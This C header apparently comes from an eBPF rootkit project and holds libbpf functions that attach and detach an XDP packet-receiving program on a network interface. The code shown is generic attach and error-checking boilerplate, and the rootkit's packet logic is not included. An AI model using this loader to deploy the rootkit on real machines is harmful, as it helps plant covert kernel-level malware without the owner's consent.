#ifndef __MOD_XDP_H
#define __MOD_XDP_H

#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <linux/if_link.h>
#include "common.h"
#include <sys/resource.h>
#include "kit.skel.h"

int attach_xdp_receive(struct kit_bpf *skel, __u32 ifindex, __u32 flags){
    //Attach BPF program to network interface
	//New way of doing it: it allows for future addition of multiple 
	//XDP programs attached to same interface if needed
	//Also done this way to modularize attaching the different tracepoints
	//of the rootkit
	/** @ref Test suite by readhat ebpf devs on XDP
	 *  https://git.zx2c4.com/linux/plain/tools/testing/selftests/bpf/prog_tests/xdp_link.c 
	 */
	struct bpf_prog_info prog_info;
	__u32 bpf_prog_info_size = sizeof(prog_info);
	__u32 xdp_prog_fd = bpf_program__fd(skel->progs.xdp_receive);
	__u32 xdp_prog_id_old = 0;
	__u32 xdp_prog_id_new;
    __u32 err;
	DECLARE_LIBBPF_OPTS(bpf_xdp_set_link_opts, opts, .old_fd = -1);
	
	memset(&prog_info, 0, bpf_prog_info_size);
	err = bpf_obj_get_info_by_fd(xdp_prog_fd, &prog_info, &bpf_prog_info_size);
	if(err<0){
		fprintf(stderr, "Failed to setup xdp link\n");
		return -1;
	}
	xdp_prog_id_new = prog_info.id;
	
	//Check whether there exists previously loaded XDP program
	err = bpf_get_link_xdp_id(ifindex, &xdp_prog_id_old, 0);
	if(err<0 || (xdp_prog_id_old!=0 && xdp_prog_id_old!=xdp_prog_id_new)){
		fprintf(stderr, "Xdp program found id--> old:%u != new:%u\n", xdp_prog_id_old, xdp_prog_id_new);
		fprintf(stderr,"This should not happen, since our xdp program is removed automatically between calls\nRun `ip link set dev lo xdpgeneric off` to detach whichever program is running");
		//TODO automatically force the reattach
		return -1;
	}

    // Attach loaded xdp program
	skel->links.xdp_receive = bpf_program__attach_xdp(skel->progs.xdp_receive, ifindex);

    err = libbpf_get_error(skel->links.xdp_receive);
	if (err<0) {
		fprintf(stderr, "Failed to attach XDP program\n");
		return -1;
	}

    return 0;
}

int attach_xdp_all(struct kit_bpf *skel, __u32 ifindex, __u32 flags){
    return attach_xdp_receive(skel, ifindex, flags);
}


int detach_xdp_receive(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.xdp_receive);
    if(err<0){
        fprintf(stderr, "Failed to detach XDP program\n");
		return -1;
    }
    return 0;
}

int detach_xdp_all(struct kit_bpf *skel){
    return detach_xdp_receive(skel);
}

#endif